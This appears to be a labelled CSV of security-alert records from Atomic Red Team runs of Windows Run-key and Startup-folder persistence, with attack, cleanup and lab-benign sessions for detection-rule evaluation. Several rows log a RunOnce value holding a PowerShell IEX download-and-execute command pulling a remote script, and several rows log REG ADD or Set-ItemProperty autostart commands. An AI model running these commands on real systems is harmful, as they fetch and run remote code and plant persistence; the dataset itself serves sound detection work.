timestamp,label,class,technique_id,ruleset_phase,session_id,rule_id,rule_canonical,rule_level,rule_description,rule_mitre,image,parent_image,command_line,command_line_normalised,target_filename,target_object,details,event_type
2026-08-08T12:36:54.183+0000,1,attack,T1547.001,custom,20260808-123635-attack-r3,92052,cmd-spawned-by-nonshell-parent,4,Windows command prompt started by an abnormal process,T1059.003,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""cmd.exe\"" /c REG ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""","\""cmd.exe\"" /c REG ADD \""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""atomicredteam.exe\""",,,,
2026-08-08T12:36:54.196+0000,1,attack,T1547.001,custom,20260808-123635-attack-r3,92041,92041,10,Value added to registry key has Base64-like pattern,T1027;T1112,C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,"REG  ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""","REG  ADD \""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""atomicredteam.exe\""",,,,
2026-08-08T12:36:54.228+0000,1,attack,T1547.001,custom,20260808-123635-attack-r3,100291,100291,8,T1547.001 Autostart Run key written by C:\\Windows\\system32\\reg.exe,T1547.001,C:\\Windows\\system32\\reg.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Atomic Red Team,C:\\Path\\AtomicRedTeam.exe,SetValue
2026-08-08T12:36:55.180+0000,1,attack,T1547.001,custom,20260808-123635-attack-r3,100290,100290,12,"T1547.001 Run key persistence with interpreter or staged payload: powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"")\""",T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,,HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun,"powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"")\""",SetValue
2026-08-08T12:36:55.253+0000,1,attack,T1547.001,custom,20260808-123635-attack-r3,100294,100294,10,T1547.001 Startup folder persistence written by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (re-attributed from T1105),T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,C:\\Users\\Basit\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk,,,
2026-08-08T12:36:56.471+0000,1,attack,T1547.001,custom,20260808-123635-attack-r3,92027,92027,4,Powershell process spawned powershell instance,T1059.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""powershell.exe\"" &amp; {if (!(Test-Path -Path \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\""\"")){   New-Item -ItemType Key -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\""\"" } if (!(Test-Path -Path \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"")){   New-Item -ItemType Key -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" } Set-ItemProperty -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" -Name \\\""\""atomictest\\\""\"" -Value \\\""\""C:\\Windows\\System32\\calc.exe\\\""\""}","\""powershell.exe\"" &amp; {if (!(Test-Path -Path \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\\""\"")){   New-Item -ItemType Key -Path  \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\\""\"" } if (!(Test-Path -Path \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\""\"")){   New-Item -ItemType Key -Path  \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\""\"" } Set-ItemProperty -Path  \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\""\"" -Name \\""\""atomictest\\""\"" -Value \\""\""calc.exe\\""\""}",,,,
2026-08-08T12:36:56.496+0000,1,attack,T1547.001,custom,20260808-123635-attack-r3,100292,100292,10,T1547.001 Autostart via policy Run key or Shell Folder redirection: HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\atomictest,T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\atomictest,C:\\Windows\\System32\\calc.exe,SetValue
2026-08-08T12:40:11.094+0000,1,attack,T1547.001,custom,20260808-123925-attack-r4,92041,92041,10,Value added to registry key has Base64-like pattern,T1027;T1112,C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,"REG  ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""","REG  ADD \""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""atomicredteam.exe\""",,,,
2026-08-08T12:40:11.095+0000,1,attack,T1547.001,custom,20260808-123925-attack-r4,100291,100291,8,T1547.001 Autostart Run key written by C:\\Windows\\system32\\reg.exe,T1547.001,C:\\Windows\\system32\\reg.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Atomic Red Team,C:\\Path\\AtomicRedTeam.exe,SetValue
2026-08-08T12:40:11.092+0000,1,attack,T1547.001,custom,20260808-123925-attack-r4,92052,cmd-spawned-by-nonshell-parent,4,Windows command prompt started by an abnormal process,T1059.003,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""cmd.exe\"" /c REG ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""","\""cmd.exe\"" /c REG ADD \""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""atomicredteam.exe\""",,,,
2026-08-08T12:40:12.027+0000,1,attack,T1547.001,custom,20260808-123925-attack-r4,100290,100290,12,"T1547.001 Run key persistence with interpreter or staged payload: powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"")\""",T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,,HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun,"powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"")\""",SetValue
2026-08-08T12:40:12.079+0000,1,attack,T1547.001,custom,20260808-123925-attack-r4,100294,100294,10,T1547.001 Startup folder persistence written by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (re-attributed from T1105),T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,C:\\Users\\Basit\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk,,,
2026-08-08T12:40:13.460+0000,1,attack,T1547.001,custom,20260808-123925-attack-r4,92027,92027,4,Powershell process spawned powershell instance,T1059.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""powershell.exe\"" &amp; {if (!(Test-Path -Path \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\""\"")){   New-Item -ItemType Key -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\""\"" } if (!(Test-Path -Path \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"")){   New-Item -ItemType Key -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" } Set-ItemProperty -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" -Name \\\""\""atomictest\\\""\"" -Value \\\""\""C:\\Windows\\System32\\calc.exe\\\""\""}","\""powershell.exe\"" &amp; {if (!(Test-Path -Path \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\\""\"")){   New-Item -ItemType Key -Path  \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\\""\"" } if (!(Test-Path -Path \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\""\"")){   New-Item -ItemType Key -Path  \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\""\"" } Set-ItemProperty -Path  \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\""\"" -Name \\""\""atomictest\\""\"" -Value \\""\""calc.exe\\""\""}",,,,
2026-08-08T12:40:13.488+0000,1,attack,T1547.001,custom,20260808-123925-attack-r4,100292,100292,10,T1547.001 Autostart via policy Run key or Shell Folder redirection: HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\atomictest,T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\atomictest,C:\\Windows\\System32\\calc.exe,SetValue
2026-08-08T12:43:16.113+0000,1,attack,T1547.001,custom,20260808-124300-attack-r5,92041,92041,10,Value added to registry key has Base64-like pattern,T1027;T1112,C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,"REG  ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""","REG  ADD \""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""atomicredteam.exe\""",,,,
2026-08-08T12:43:16.113+0000,1,attack,T1547.001,custom,20260808-124300-attack-r5,92052,cmd-spawned-by-nonshell-parent,4,Windows command prompt started by an abnormal process,T1059.003,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""cmd.exe\"" /c REG ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""","\""cmd.exe\"" /c REG ADD \""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""atomicredteam.exe\""",,,,
2026-08-08T12:43:16.139+0000,1,attack,T1547.001,custom,20260808-124300-attack-r5,100291,100291,8,T1547.001 Autostart Run key written by C:\\Windows\\system32\\reg.exe,T1547.001,C:\\Windows\\system32\\reg.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Atomic Red Team,C:\\Path\\AtomicRedTeam.exe,SetValue
2026-08-08T12:43:17.107+0000,1,attack,T1547.001,custom,20260808-124300-attack-r5,100290,100290,12,"T1547.001 Run key persistence with interpreter or staged payload: powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"")\""",T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,,HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun,"powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"")\""",SetValue
2026-08-08T12:43:17.325+0000,1,attack,T1547.001,custom,20260808-124300-attack-r5,100294,100294,10,T1547.001 Startup folder persistence written by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (re-attributed from T1105),T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,C:\\Users\\Basit\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk,,,
2026-08-08T12:43:18.363+0000,1,attack,T1547.001,custom,20260808-124300-attack-r5,92027,92027,4,Powershell process spawned powershell instance,T1059.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""powershell.exe\"" &amp; {if (!(Test-Path -Path \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\""\"")){   New-Item -ItemType Key -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\""\"" } if (!(Test-Path -Path \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"")){   New-Item -ItemType Key -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" } Set-ItemProperty -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" -Name \\\""\""atomictest\\\""\"" -Value \\\""\""C:\\Windows\\System32\\calc.exe\\\""\""}","\""powershell.exe\"" &amp; {if (!(Test-Path -Path \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\\""\"")){   New-Item -ItemType Key -Path  \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\\""\"" } if (!(Test-Path -Path \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\""\"")){   New-Item -ItemType Key -Path  \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\""\"" } Set-ItemProperty -Path  \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\""\"" -Name \\""\""atomictest\\""\"" -Value \\""\""calc.exe\\""\""}",,,,
2026-08-08T12:43:18.413+0000,1,attack,T1547.001,custom,20260808-124300-attack-r5,100292,100292,10,T1547.001 Autostart via policy Run key or Shell Folder redirection: HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\atomictest,T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\atomictest,C:\\Windows\\System32\\calc.exe,SetValue
2026-08-08T12:46:04.150+0000,0,unlabelled,,,,60642,60642,3,Software protection service scheduled successfully.,,,,,,,,,
2026-08-08T12:49:45.462+0000,0,unlabelled,,,,92052,cmd-spawned-by-nonshell-parent,4,Windows command prompt started by an abnormal process,T1059.003,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""cmd.exe\"" /c REG DELETE \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /f &gt;nul 2&gt;&amp;1","\""cmd.exe\"" /c REG DELETE \""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"" /V \""Atomic Red Team\"" /f &gt;nul 2&gt;&amp;1",,,,
2026-08-08T12:49:46.803+0000,0,unlabelled,,,,92027,92027,4,Powershell process spawned powershell instance,T1059.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""powershell.exe\"" &amp; {Remove-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce -Name \\\""\""NextRun\\\""\"" -Force -ErrorAction Ignore}","\""powershell.exe\"" &amp; {Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name \\""\""NextRun\\""\"" -Force -ErrorAction Ignore}",,,,
2026-08-08T12:49:47.929+0000,0,unlabelled,,,,92027,92027,4,Powershell process spawned powershell instance,T1059.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""powershell.exe\"" &amp; {Remove-ItemProperty -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" -Name \\\""\""atomictest\\\""\""}","\""powershell.exe\"" &amp; {Remove-ItemProperty -Path  \\""\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\""\"" -Name \\""\""atomictest\\""\""}",,,,
2026-08-08T12:52:18.368+0000,1,benign,T1547.001,custom,20260808-125216-benign-r1,92004,cmd-spawned-by-nonshell-parent,4,Powershell process spawned Windows command shell instance,T1059.003,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\system32\\cmd.exe\"" /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabBenignUpdater /t REG_SZ /d C:\\ProgramData\\LabBenign\\updater.exe /f","\""cmd.exe\"" /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabBenignUpdater /t REG_SZ /d updater.exe /f",,,,
2026-08-08T12:52:18.399+0000,1,benign,T1547.001,custom,20260808-125216-benign-r1,92041,92041,10,Value added to registry key has Base64-like pattern,T1027;T1112,C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabBenignUpdater /t REG_SZ /d C:\\ProgramData\\LabBenign\\updater.exe /f,reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabBenignUpdater /t REG_SZ /d updater.exe /f,,,,
2026-08-08T12:52:18.453+0000,1,benign,T1547.001,custom,20260808-125216-benign-r1,100291,100291,8,T1547.001 Autostart Run key written by C:\\Windows\\system32\\reg.exe,T1547.001,C:\\Windows\\system32\\reg.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\LabBenignUpdater,C:\\ProgramData\\LabBenign\\updater.exe,SetValue
2026-08-08T12:52:23.353+0000,1,benign,T1547.001,custom,20260808-125216-benign-r1,92027,92027,4,Powershell process spawned powershell instance,T1059.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""Set-ItemProperty -Path \\\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\\"" -Name LabBenignFirstRun -Value \\\""C:\\ProgramData\\LabBenign\\firstrun.exe\\\""\""","\""powershell.exe\"" -NoProfile -Command \""Set-ItemProperty -Path \\""HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce\\"" -Name LabBenignFirstRun -Value \\""firstrun.exe\\""\""",,,,
2026-08-08T12:52:23.367+0000,1,benign,T1547.001,custom,20260808-125216-benign-r1,100291,100291,8,T1547.001 Autostart Run key written by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\LabBenignFirstRun,C:\\ProgramData\\LabBenign\\firstrun.exe,SetValue
2026-08-08T12:52:27.407+0000,1,benign,T1547.001,custom,20260808-125216-benign-r1,100294,100294,10,T1547.001 Startup folder persistence written by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (re-attributed from T1105),T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,C:\\Users\\Basit\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\LabBenignAgent.lnk,,,
2026-08-08T12:52:31.401+0000,1,benign,T1547.001,custom,20260808-125216-benign-r1,92027,92027,4,Powershell process spawned powershell instance,T1059.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""New-Item -Path \\\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\"" -Force | Out-Null; New-Item -Path \\\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\"" -Force | Out-Null; Set-ItemProperty -Path \\\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\"" -Name LabBenignPolicy -Value \\\""C:\\Windows\\System32\\notepad.exe\\\""\""","\""powershell.exe\"" -NoProfile -Command \""New-Item -Path \\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\\"" -Force | Out-Null; New-Item -Path \\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\"" -Force | Out-Null; Set-ItemProperty -Path \\""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\\"" -Name LabBenignPolicy -Value \\""notepad.exe\\""\""",,,,
2026-08-08T12:52:31.460+0000,1,benign,T1547.001,custom,20260808-125216-benign-r1,100292,100292,10,T1547.001 Autostart via policy Run key or Shell Folder redirection: HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\LabBenignPolicy,T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\LabBenignPolicy,C:\\Windows\\System32\\notepad.exe,SetValue
2026-08-08T12:52:35.444+0000,1,benign,T1547.001,custom,20260808-125216-benign-r1,100290,100290,12,T1547.001 Run key persistence with interpreter or staged payload: powershell.exe -NoProfile -File C:\\ProgramData\\LabBenign\\sync.ps1,T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\LabBenignSync,powershell.exe -NoProfile -File C:\\ProgramData\\LabBenign\\sync.ps1,SetValue
2026-08-08T12:55:15.493+0000,1,benign,T1547.001,custom,20260808-125500-benign-r2,92004,cmd-spawned-by-nonshell-parent,4,Powershell process spawned Windows command shell instance,T1059.003,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\system32\\cmd.exe\"" /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabBenignUpdater /t REG_SZ /d C:\\ProgramData\\LabBenign\\updater.exe /f","\""cmd.exe\"" /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabBenignUpdater /t REG_SZ /d updater.exe /f",,,,
2026-08-08T12:55:15.523+0000,1,benign,T1547.001,custom,20260808-125500-benign-r2,100291,100291,8,T1547.001 Autostart Run key written by C:\\Windows\\system32\\reg.exe,T1547.001,C:\\Windows\\system32\\reg.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\LabBenignUpdater,C:\\ProgramData\\LabBenign\\updater.exe,SetValue
2026-08-08T12:55:15.523+0000,1,benign,T1547.001,custom,20260808-125500-benign-r2,92041,92041,10,Value added to registry key has Base64-like pattern,T1027;T1112,C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabBenignUpdater /t REG_SZ /d C:\\ProgramData\\LabBenign\\updater.exe /f,reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabBenignUpdater /t REG_SZ /d updater.exe /f,,,,
2026-08-08T12:55:19.539+0000,1,benign,T1547.001,custom,20260808-125500-benign-r2,92027,92027,4,Powershell process spawned powershell instance,T1059.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""Set-ItemProperty -Path \\\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\\"" -Name LabBenignFirstRun -Value \\\""C:\\ProgramData\\LabBenign\\firstrun.exe\\\""\""","\""powershell.exe\"" -NoProfile -Command \""Set-ItemProperty -Path \\""HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce\\"" -Name LabBenignFirstRun -Value \\""firstrun.exe\\""\""",,,,
2026-08-08T12:55:19.569+0000,1,benign,T1547.001,custom,20260808-125500-benign-r2,100291,100291,8,T1547.001 Autostart Run key written by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,T1547.001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,,,HKU\\S-1-5-21-2222415442-2274113341-2221785704-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\LabBenignFirstRun,C:\\ProgramData\\LabBenign\\firstrun.exe,SetValue
